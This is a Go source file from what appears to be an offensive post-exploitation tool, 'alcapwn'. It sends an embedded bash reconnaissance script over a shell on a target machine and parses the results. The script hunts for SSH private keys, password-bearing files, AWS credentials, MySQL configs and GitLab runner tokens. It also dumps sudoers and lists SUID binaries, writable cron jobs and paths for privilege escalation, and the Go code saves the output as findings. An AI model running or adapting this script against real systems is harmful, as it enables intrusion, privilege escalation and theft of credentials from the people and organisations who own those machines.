package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

const reconScriptTemplate = `#!/bin/bash
# ============================================================
# AUTOMATED RECONNAISSANCE SCRIPT
# ============================================================

echo "[*] Starting reconnaissance..."
echo "============================================================"
echo ""

# ------------------------------------------------------------
# BACKGROUND JOBS — launch slow filesystem traversals immediately
# so they run while the fast sections below execute.
# Results are written to a temp dir and consumed via wait+cat.
# ------------------------------------------------------------
_T=/tmp/.alcapwn_$$
mkdir -p "$_T" 2>/dev/null
trap 'rm -rf "$_T" 2>/dev/null' EXIT
set +m  # suppress "[N] PID" and "Done" job control messages in PTY output

find / -perm -4000 -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50 > "$_T/suid" &
_SUID_PID=$!
find / -perm -2000 -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50 > "$_T/sgid" &
_SGID_PID=$!
find / \( -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" \) ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -10 > "$_T/ssh" &
_SSH_PID=$!
find /etc -maxdepth 4 -writable -type f 2>/dev/null | head -20 > "$_T/wetc" &
_WETC_PID=$!
grep -rl "password\|passwd\|pass=" /etc /home /var/www /opt 2>/dev/null | grep -vE "\.(pyc|png|jpg|gif|so|a|db|sqlite)$" | head -30 > "$_T/pwdfiles" &
_PWD_PID=$!

# ------------------------------------------------------------
# SECTION 1: IDENTITY
# ------------------------------------------------------------
echo "[SECTION 1:{{NONCE}}] IDENTITY"
echo "------------------------------------------------------------"
echo "Hostname: $(hostname)"
echo "Current user: $(whoami)"
echo "User ID: $(id)"
echo "Home directory: $(echo $HOME)"
echo "Current directory: $(pwd)"

# Detect OS type
OS_INFO=""
if [ -f /etc/os-release ]; then
    OS_INFO=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"')
    if [ -n "$OS_INFO" ]; then
        echo "OS Info: $OS_INFO"
    else
        # Fallback: try ID_LIKE or just uname
        ID_LIKE=$(grep ID_LIKE /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"')
        if [ -n "$ID_LIKE" ]; then
            echo "OS Info: $ID_LIKE (from /etc/os-release ID_LIKE)"
        else
            echo "OS Info: $(uname -s) $(uname -r)"
        fi
    fi
elif [ -f /System/Volumes/Preboot/Cryptexes/OS/System/Library/CoreServices/SystemVersion.plist ]; then
    echo "OS Info: macOS (detected via SystemVersion.plist)"
else
    echo "OS Info: $(uname -s) $(uname -r)"
fi

# Additional OS-specific checks
if [ -d /System/Volumes/Preboot ]; then
    echo "macOS Detected: Yes"
    echo "macOS Version: $(sw_vers 2>/dev/null | grep -E "(ProductName|ProductVersion|BuildVersion)" | tr '\n' ' ')"
elif [ -f /etc/debian_version ]; then
    echo "Debian Version: $(cat /etc/debian_version)"
elif [ -f /etc/os-release ]; then
    # Check for Raspberry Pi OS specifically
    if grep -q "Raspbian\|raspberry" /etc/os-release 2>/dev/null; then
        echo "Raspberry Pi OS Detected: Yes"
    fi
fi

# Check for Raspberry Pi specifically
if [ -f /sys/firmware/devicetree/base/model ]; then
    PI_MODEL=$(cat /sys/firmware/devicetree/base/model 2>/dev/null)
    if [ -n "$PI_MODEL" ]; then
        echo "Hardware Model: $PI_MODEL"
    fi
fi

echo "Kernel Version: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "Users in system: $(cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1)"
echo ""

# ------------------------------------------------------------
# SECTION 2: SUDO ACCESS
# ------------------------------------------------------------
echo "[SECTION 2:{{NONCE}}] SUDO ACCESS"
echo "------------------------------------------------------------"
echo "Sudoers file:"
if [ -f /etc/sudoers ]; then cat /etc/sudoers 2>/dev/null; fi
echo ""
echo "User sudo privileges:"
sudo -n -l 2>/dev/null || echo "Cannot check sudo privileges"
echo ""

# ------------------------------------------------------------
# SECTION 3: SUID/SGID BINARIES
# ------------------------------------------------------------
echo "[SECTION 3:{{NONCE}}] SUID/SGID BINARIES"
echo "------------------------------------------------------------"
echo "SUID binaries:"
wait $_SUID_PID 2>/dev/null; cat "$_T/suid" 2>/dev/null
echo ""
echo "SGID binaries:"
wait $_SGID_PID 2>/dev/null; cat "$_T/sgid" 2>/dev/null
echo ""

# ------------------------------------------------------------
# SECTION 4: CAPABILITIES
# ------------------------------------------------------------
echo "[SECTION 4:{{NONCE}}] CAPABILITIES"
echo "------------------------------------------------------------"
echo "Files with capabilities:"
getcap /usr/bin/* /usr/sbin/* /usr/local/bin/* /usr/local/sbin/* /bin/* /sbin/* 2>/dev/null || echo "getcap not available"
echo ""

# ------------------------------------------------------------
# SECTION 5: CRON JOBS
# ------------------------------------------------------------
echo "[SECTION 5:{{NONCE}}] CRON JOBS"
echo "------------------------------------------------------------"
echo "System crontab:"
cat /etc/crontab 2>/dev/null || echo "Cannot read /etc/crontab"
echo ""
echo "Writable cron scripts:"
for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$crondir" ]; then
        find "$crondir" -maxdepth 1 -type f -writable 2>/dev/null | while read -r f; do
            echo "Writable: $f"
        done
    fi
done
echo ""

# ------------------------------------------------------------
# SECTION 6: WRITABLE PATHS
# ------------------------------------------------------------
echo "[SECTION 6:{{NONCE}}] WRITABLE PATHS"
echo "------------------------------------------------------------"
echo "Paths writable by current user:"
for dir in /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /tmp /var/tmp; do
    if [ -w "$dir" ]; then echo "Writable: $dir"; fi
done
echo ""
echo "Writable files in common locations:"
wait $_WETC_PID 2>/dev/null; cat "$_T/wetc" 2>/dev/null
echo ""

# ------------------------------------------------------------
# SECTION 7: ENVIRONMENT & TOOLS
# ------------------------------------------------------------
echo "[SECTION 7:{{NONCE}}] ENVIRONMENT & TOOLS"
echo "------------------------------------------------------------"
echo "Environment variables:"
env 2>/dev/null | head -30
echo ""
echo "Available tools:"
which python python3 perl ruby php nc ncat netcat socat wget curl bash zsh 2>/dev/null
echo ""
echo "Python version:"
python --version 2>/dev/null || python3 --version 2>/dev/null || echo "No Python found"
echo ""

# ------------------------------------------------------------
# SECTION 8: INTERESTING FILES
# ------------------------------------------------------------
echo "[SECTION 8:{{NONCE}}] INTERESTING FILES"
echo "------------------------------------------------------------"
echo "SSH keys:"
wait $_SSH_PID 2>/dev/null; cat "$_T/ssh" 2>/dev/null
echo ""
echo "Passwords in files:"
wait $_PWD_PID 2>/dev/null; cat "$_T/pwdfiles" 2>/dev/null
echo ""
echo "Apache/Nginx config:"
ls -la /etc/apache2/ 2>/dev/null || ls -la /etc/nginx/ 2>/dev/null || echo "No web server config found"
echo ""
echo "AWS credentials:"
for awspath in "$HOME/.aws/credentials" /root/.aws/credentials; do
    [ -f "$awspath" ] && echo "AWS credentials found: $awspath" && cat "$awspath" 2>/dev/null | head -5
done
echo ""
echo "MySQL config:"
for mycnf in "$HOME/.my.cnf" /root/.my.cnf /etc/mysql/debian.cnf; do
    [ -f "$mycnf" ] && echo "MySQL config found: $mycnf" && cat "$mycnf" 2>/dev/null | head -10
done
echo ""

# ------------------------------------------------------------
# SECTION 9: RUNNING SERVICES
# ------------------------------------------------------------
echo "[SECTION 9:{{NONCE}}] RUNNING SERVICES"
echo "------------------------------------------------------------"
echo "Listening ports:"
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null || echo "Cannot get listening ports"
echo ""
echo "Running processes:"
ps aux 2>/dev/null | head -30
echo ""
echo "Services:"
systemctl list-units --type=service --state=running 2>/dev/null | head -20 || echo "systemctl not available"
echo ""

# ------------------------------------------------------------
# SECTION 10: SERVICE VERSION DETECTION
# ------------------------------------------------------------
echo "[SECTION 10:{{NONCE}}] SERVICE VERSION DETECTION"
echo "------------------------------------------------------------"
echo "Checking for common services with versions:"

# Check Apache/Nginx
which apache2ctl 2>/dev/null && apache2ctl -v 2>/dev/null || which nginx 2>/dev/null && nginx -v 2>/dev/null || echo "No Apache/Nginx found"

# Check PHP
which php 2>/dev/null && php -v 2>/dev/null | head -1 || echo "No PHP found"

# Check Python
which python 2>/dev/null && python --version 2>/dev/null || which python3 2>/dev/null && python3 --version 2>/dev/null || echo "No Python found"

# Check Node.js
which node 2>/dev/null && node -v 2>/dev/null || echo "No Node.js found"

# Check Docker
which docker 2>/dev/null && docker --version 2>/dev/null || echo "No Docker CLI found"

# Check Kubernetes
which kubectl 2>/dev/null && timeout 5 kubectl version --client 2>/dev/null || echo "No kubectl found"

# Check MySQL
which mysql 2>/dev/null && mysql --version 2>/dev/null || echo "No MySQL client found"

# Check PostgreSQL
which psql 2>/dev/null && psql --version 2>/dev/null || echo "No PostgreSQL client found"

# Check MongoDB
which mongosh 2>/dev/null && mongosh --version 2>/dev/null || which mongo 2>/dev/null && mongo --version 2>/dev/null || echo "No MongoDB client found"

# Check GitLab Runner token
[ -f /etc/gitlab-runner/config.toml ] && grep "token" /etc/gitlab-runner/config.toml 2>/dev/null || echo "No GitLab runner config found"

echo ""

# ------------------------------------------------------------
# SECTION 11: DOCKER SOCKET DETECTION
# ------------------------------------------------------------
echo "[SECTION 11:{{NONCE}}] DOCKER SOCKET DETECTION"
echo "------------------------------------------------------------"
echo "Docker socket locations:"
ls -la /var/run/docker.sock 2>/dev/null || echo "/var/run/docker.sock not found"
ls -la /run/docker.sock 2>/dev/null || echo "/run/docker.sock not found"
[ -S /var/run/docker.sock ] && echo "Docker socket exists and is accessible" || echo "No accessible Docker socket"
echo ""

# Check if Docker daemon is exposed on port 2375/2376
echo "Docker daemon ports:"
ss -tuln 2>/dev/null | grep -E ":(2375|2376)" || echo "No Docker daemon ports detected"
echo ""

# ------------------------------------------------------------
# SECTION 12: KERNEL VERSION
# ------------------------------------------------------------
echo "[SECTION 12:{{NONCE}}] KERNEL VERSION"
echo "------------------------------------------------------------"
echo "Kernel version: $(uname -r)"
echo "Kernel release: $(uname -v)"
echo ""

# Check for kernel CVE candidates
echo "Checking for known kernel CVEs based on version patterns:"
KVER=$(uname -r)
# Check if version contains rpi (Raspberry Pi kernel)
if echo "$KVER" | grep -q "rpi"; then
    echo "Raspberry Pi kernel detected: $KVER"
fi
# Check if version contains AWS EC2 pattern
if echo "$KVER" | grep -q "amzn"; then
    echo "Amazon Linux kernel detected: $KVER"
fi
echo ""

# ------------------------------------------------------------
# SECTION 13: CONTAINER/VM DETECTION
# ------------------------------------------------------------
echo "[SECTION 13:{{NONCE}}] CONTAINER/VM DETECTION"
echo "------------------------------------------------------------"
echo "Checking for containerization:"

# macOS-specific container detection
if [ -d /System/Volumes/Preboot ]; then
    echo "Running on macOS"
    # Check for Docker Desktop or similar
    pgrep -a "Docker" 2>/dev/null | head -5 || echo "Docker process not running"
    ls -la ~/Library/Containers/ 2>/dev/null | grep -i docker || echo "No Docker containers in ~/Library/Containers"
else
    # Linux container detection
    cat /proc/1/cgroup 2>/dev/null | grep -E "(docker|lxc|containerd)" || echo "Not in LXC/Docker"
    cat /proc/self/cgroup 2>/dev/null | grep -E "(docker|lxc|containerd)" || echo ""
    cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -E "(container|docker)" || echo ""
fi

echo ""
echo "Checking for virtualization:"
lscpu 2>/dev/null | grep "Hypervisor" || echo "No hypervisor detected"
timeout 3 dmidecode -s system-product-name 2>/dev/null || echo "dmidecode not available"
echo ""
echo "Checking for Docker specifically:"
[ -f /.dockerenv ] && echo "Docker environment detected" || echo "Not in Docker"
[ -f /proc/1/cgroup ] && grep -q docker /proc/1/cgroup && echo "Docker cgroup detected" || echo ""

echo "============================================================"
echo "[*] Reconnaissance complete!"
echo "============================================================"

# Restore job control and clean up
set -m
rm -rf "$_T" 2>/dev/null
unset _T _SUID_PID _SGID_PID _SSH_PID _WETC_PID

# Sentinel to mark the end of recon output
echo "ALCAPWN_RECON_COMPLETE_7f3x9q"`

const sentinel = "ALCAPWN_RECON_COMPLETE_7f3x9q"

var reconSections = []string{
	"IDENTITY",
	"SUDO ACCESS",
	"SUID/SGID BINARIES",
	"CAPABILITIES",
	"CRON JOBS",
	"WRITABLE PATHS",
	"ENVIRONMENT & TOOLS",
	"INTERESTING FILES",
	"RUNNING SERVICES",
	"SERVICE VERSION DETECTION",
	"DOCKER SOCKET DETECTION",
	"KERNEL VERSION",
	"CONTAINER/VM DETECTION",
}

// makeReconNonce returns a random 8-hex-char nonce unique to this recon session.
// The nonce is embedded in every section header echo in the script so that
// injected fake headers (via env vars, file content, etc.) cannot match the
// per-session section header regex — the attacker cannot know the nonce in advance.
func makeReconNonce() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "alcapwn0" // fallback: weaker but functional
	}
	return fmt.Sprintf("%x", b)
}

// buildReconScript substitutes the per-session nonce into the script template.
func buildReconScript(nonce string) string {
	return strings.ReplaceAll(reconScriptTemplate, "{{NONCE}}", nonce)
}

// buildSectionRe returns a regex that matches real section header lines for this session.
// Group 1 = section number, group 2 = section name.
// The nonce is required in the header so fake headers injected by the target cannot match.
func buildSectionRe(nonce string) *regexp.Regexp {
	return regexp.MustCompile(`^\[SECTION (\d+):` + regexp.QuoteMeta(nonce) + `\]\s+(.+)`)
}

// stripANSI removes ANSI escape sequences from text.
// Applies OSC stripping (reStripOSC) before CSI stripping (reStripCSI) since
// OSC sequences can embed CSI-like substrings. Both regexes are defined in
// pty_upgrader.go and used consistently with StripPrompts.
func stripANSI(s string) string {
	s = reStripOSC.ReplaceAllString(s, "")
	return reStripCSI.ReplaceAllString(s, "")
}

const reconBarWidth = 10 // width of the mini block bar shown in the task detail

// reconDetail builds the detail string shown next to the Reconnaissance task:
//
//	"█████░░░░░  6/13  CRON JOBS"
func reconDetail(current, total int, label string) string {
	filled := 0
	if total > 0 {
		filled = (current * reconBarWidth) / total
	}
	if filled < 0 {
		filled = 0
	}
	if filled > reconBarWidth {
		filled = reconBarWidth
	}
	bar := strings.Repeat("█", filled) + strings.Repeat("░", reconBarWidth-filled)
	if len(label) > 22 {
		label = label[:22]
	}
	return fmt.Sprintf("%s  %2d/%-2d  %s", bar, current, total, label)
}

// stripPS2Lines removes bash PS2 continuation prompt lines from output.
// PS2 lines are bare ">" or "> " lines that bash emits when reading multi-line input.
func stripPS2Lines(output string) string {
	lines := strings.Split(output, "\n")
	result := make([]string, 0, len(lines))
	for _, line := range lines {
		stripped := strings.TrimSpace(strings.ReplaceAll(line, "\r", ""))
		// Only skip true PS2 prompts: bare ">" or "> " followed by content.
		// Do NOT strip bash keywords (if/for/done/echo/etc.) — they can appear
		// legitimately in crontabs, sudoers, config files, and ps output.
		if stripped == ">" || strings.HasPrefix(stripped, "> ") {
			continue
		}
		result = append(result, line)
	}
	return strings.Join(result, "\n")
}

// PTY interface for recon.go to call
type PTY interface {
	readUntilSentinel(sentinel string, timeout time.Duration) (string, error)
	readUntilSentinelProgress(sentinel string, timeout time.Duration, onLine func(string)) (string, error)
	readUntilPrompt(timeout time.Duration) (string, error)
	StripPrompts(output string) string
	write(data string) error
}

// executeRecon executes the reconnaissance script and returns the path of the saved
// raw file (empty if not saved) and a map of section name → section text.
// A per-session nonce is embedded in every section header echo in the script so that
// fake headers injected by a hostile target (via env vars, file content, etc.) cannot
// be mistaken for real section boundaries.
func executeRecon(u PTY, findingsDir string, host string, disp *statusDisplay, reconIdx int) (string, map[string]string, error) {
	nonce := makeReconNonce()
	sectionRe := buildSectionRe(nonce)

	if err := u.write(buildReconScript(nonce) + "\n"); err != nil {
		disp.set(reconIdx, taskFailed, "write error")
		return "", nil, err
	}

	total := len(reconSections)
	current := 0
	disp.set(reconIdx, taskRunning, reconDetail(0, total, "starting"))

	raw, err := u.readUntilSentinelProgress(sentinel, 5*time.Second, func(line string) {
		// Clean just enough for header detection; raw accumulation is unaffected.
		clean := strings.TrimRight(stripANSI(strings.ReplaceAll(line, "\r", "")), "\n\r ")
		if m := sectionRe.FindStringSubmatch(clean); m != nil {
			current++
			disp.set(reconIdx, taskRunning, reconDetail(current, total, strings.TrimSpace(m[2])))
		}
	})

	if err != nil {
		disp.set(reconIdx, taskFailed, reconDetail(current, total, "timed out"))
		return "", nil, err
	}
	disp.set(reconIdx, taskDone, "")

	// Clean the accumulated output.
	raw = stripANSI(raw)
	raw = strings.ReplaceAll(raw, "\r", "")
	raw = stripPS2Lines(raw)
	raw = u.StripPrompts(raw)

	rawPath := ""
	if findingsDir != "" {
		rawPath = saveRawOutput(raw, findingsDir, host)
	}

	return rawPath, extractAllSections(raw, sectionRe), nil
}

func saveRawOutput(output string, findingsDir string, host string) string {
	// Create findings directory if needed
	if err := os.MkdirAll(findingsDir, 0700); err != nil {
		fmt.Printf("[!] Could not create findings directory: %v\n", err)
		return ""
	}

	// Sanitize host for use in filename: strip port, replace colons (IPv6) with underscores.
	if idx := strings.LastIndex(host, ":"); idx > 0 {
		host = host[:idx]
	}
	host = strings.ReplaceAll(host, ":", "_")
	if host == "" {
		host = "target"
	}

	// Generate filename with timestamp
	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("raw_%s_%s.txt", host, timestamp)
	outpath := filepath.Join(findingsDir, filename)

	if err := os.WriteFile(outpath, []byte(output), 0600); err != nil {
		fmt.Printf("[!] Could not save raw output: %v\n", err)
		return ""
	}

	return outpath
}

// extractAllSections performs a single forward pass over the cleaned recon output and
// returns a map of section name → section text.
//
// sectionRe must include the per-session nonce (see buildSectionRe) so injected fake
// headers cannot match. Ordering is also enforced: a header is accepted only when its
// section number equals the next expected number, providing defence-in-depth even if
// the nonce were somehow known to the attacker.
func extractAllSections(raw string, sectionRe *regexp.Regexp) map[string]string {
	// Sanitize all lines once (ANSI already stripped by executeRecon; null bytes and
	// oversized lines may still be present after cleaning).
	lines := strings.Split(raw, "\n")
	sanitized := make([]string, 0, len(lines))
	for _, line := range lines {
		clean := strings.ReplaceAll(line, "\x00", "")
		if len(clean) > 2048 {
			clean = clean[:2048]
		}
		stripped := strings.TrimSpace(clean)
		if stripped == ">" || strings.HasPrefix(stripped, "> ") {
			continue
		}
		sanitized = append(sanitized, clean)
	}

	// Build index: 1-based section number → section name, from reconSections order.
	sectionByNum := make(map[int]string, len(reconSections))
	for i, name := range reconSections {
		sectionByNum[i+1] = name
	}

	// Forward pass: accept a section header only when its number equals nextExpected.
	// Out-of-order and duplicate headers (injected content) are silently skipped.
	type span struct{ start, end int }
	spans := make(map[string]span, len(reconSections))
	order := make([]string, 0, len(reconSections))
	nextExpected := 1

	for i, line := range sanitized {
		m := sectionRe.FindStringSubmatch(strings.TrimSpace(line))
		if m == nil {
			continue
		}
		n, ok := stringToInt(m[1])
		if !ok || n != nextExpected {
			continue // wrong order or bad number — injected header, skip
		}
		name, exists := sectionByNum[n]
		if !exists {
			continue
		}
		spans[name] = span{start: i}
		order = append(order, name)
		nextExpected++
	}

	// Fill end boundaries: each section ends where the next begins.
	for i, name := range order {
		s := spans[name]
		if i+1 < len(order) {
			s.end = spans[order[i+1]].start
		} else {
			s.end = len(sanitized)
		}
		spans[name] = s
	}

	// Build result map.
	result := make(map[string]string, len(reconSections))
	for _, name := range order {
		s := spans[name]
		result[name] = strings.Join(sanitized[s.start:s.end], "\n")
	}
	return result
}
